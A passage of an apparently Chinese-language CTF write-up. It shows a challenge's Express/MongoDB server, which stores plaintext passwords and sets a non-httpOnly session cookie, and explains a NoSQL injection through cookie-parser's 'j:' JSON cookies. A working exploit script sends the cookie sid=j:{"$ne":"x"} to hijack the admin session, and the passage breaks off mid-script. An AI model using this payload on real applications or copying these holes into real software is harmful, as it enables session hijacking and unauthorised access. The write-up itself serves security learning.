    <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username<span class="token operator">:</span> session<span class="token punctuation">.</span>username <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      req<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    req<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token punctuation">&#123;</span> username<span class="token operator">:</span> user<span class="token punctuation">.</span>username <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error in session middleware:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> _res<span class="token operator">:</span> Response<span class="token punctuation">,</span> next<span class="token operator">:</span> NextFunction<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  req<span class="token punctuation">.</span>collections <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    users<span class="token operator">:</span> usersCollection<span class="token punctuation">,</span>
    sessions<span class="token operator">:</span> sessionsCollection
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>sessionMiddleware <span class="token keyword">as</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>_req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>publicDir<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body <span class="token keyword">as</span> <span class="token punctuation">&#123;</span> username<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">unknown</span><span class="token punctuation">;</span> password<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">unknown</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> username <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> password <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'username and password must be strings'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'username and password required'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>usersCollection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'Database not initialized yet'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'admin user not available'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">insertOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      user <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user <span class="token operator">||</span> user<span class="token punctuation">.</span>password <span class="token operator">!==</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'invalid credentials'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">createSessionForUser</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>

    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'sid'</span><span class="token punctuation">,</span> sid<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      httpOnly<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
      sameSite<span class="token operator">:</span> <span class="token string">'lax'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      ok<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
      sid<span class="token punctuation">,</span>
      username<span class="token operator">:</span> user<span class="token punctuation">.</span>username
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error in /login:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'internal error'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">clearCookie</span><span class="token punctuation">(</span><span class="token string">'sid'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> ok<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/me'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> loggedIn<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    loggedIn<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    username<span class="token operator">:</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>username
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>user <span class="token operator">||</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'admin only'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> flag<span class="token operator">:</span> <span class="token constant">FLAG</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/visit'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> Request<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> url <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body <span class="token keyword">as</span> <span class="token punctuation">&#123;</span> url<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">unknown</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> url <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'url must be a string'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">await</span> <span class="token function">runXssVisit</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> ok<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'XSS bot error:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'bot failed'</span><span class="token punctuation">,</span> detail<span class="token operator">:</span> <span class="token function">String</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">initMongo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token operator">:</span> <span class="token builtin">unknown</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Failed to initialize MongoDB:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>NoSQL 注入</p>
<p><code>cookie-parser</code> 中间件未指定任何选项，因此默认启用 JSON cookie 解析。如果 cookie 值以 <code>j:</code> 开头，它会将后面的 JSON 字符串解析为一个对象</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> request <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'supertest'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">sid</span><span class="token operator">:</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid<span class="token punctuation">,</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// Test normal cookie</span>
  <span class="token keyword">await</span> <span class="token function">request</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Cookie'</span><span class="token punctuation">,</span> <span class="token string">'sid=123'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Normal:'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Test JSON cookie</span>
  <span class="token keyword">await</span> <span class="token function">request</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Cookie'</span><span class="token punctuation">,</span> <span class="token string">'sid=j:&#123;"$ne":"x"&#125;'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'JSON:'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Normal: &#123; sid: '123', type: 'string' &#125;</span>
<span class="token comment">// JSON: &#123; sid: &#123; '$ne': 'x' &#125;, type: 'object' &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 server.ts 中，<code>sid</code> 变量是从 <code>req.cookies.sid</code> 中获取的。虽然 TypeScript 将其类型定义为 <code>string | undefined</code>，但如果 cookie 构造得当，运行时它可以是一个对象</p>
<p>然后，<code>sid</code> 直接传递给 <code>sessionsCollection.findOne(&#123; sid &#125;)</code> 查询</p>
<p>如果我们发送类似 <code>sid=j:&#123;&quot;$ne&quot;:null&#125;</code> 的 cookie，MongoDB 查询将变为 <code>db.sessions.findOne(&#123; sid: &#123; $ne: null &#125; &#125;)</code>，这个查询会查询到 session 中的第一个会话，即管理员会话</p>
<p>那么就能以管理员身份访问了</p>
<p>exp.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

BASE_URL <span class="token operator">=</span> <span class="token string">"http://223.6.249.127:31728"</span>


<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Step 1: Trigger the bot to create an admin session</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Triggering bot login..."</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/visit"</span></span><span class="token punctuation">,</span>
                      json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"http://example.com/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                      timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>  <span class="token comment"># Ignore potential timeout or errors, we just need the login to happen</span>

    <span class="token comment"># Wait a moment for the bot to ensure login</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

    <span class="token comment"># Step 2: Send request with malicious JSON cookie</span>
    <span class="token comment"># Encoded value for j:&#123;"$ne":"x"&#125;</span>
    <span class="token comment"># We can send it raw or URL encoded. requests handles it.</span>

    <span class="token comment"># Cookie value: j:&#123;"$ne":"x"&#125;</span>
    cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"sid"</span><span class="token punctuation">:</span> <span class="token string">'j:&#123;"$ne":"x"&#125;'</span><span class="token punctuation">&#125;</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Sending malicious cookie to /admin..."</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin"</span></span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>

    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Flag found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
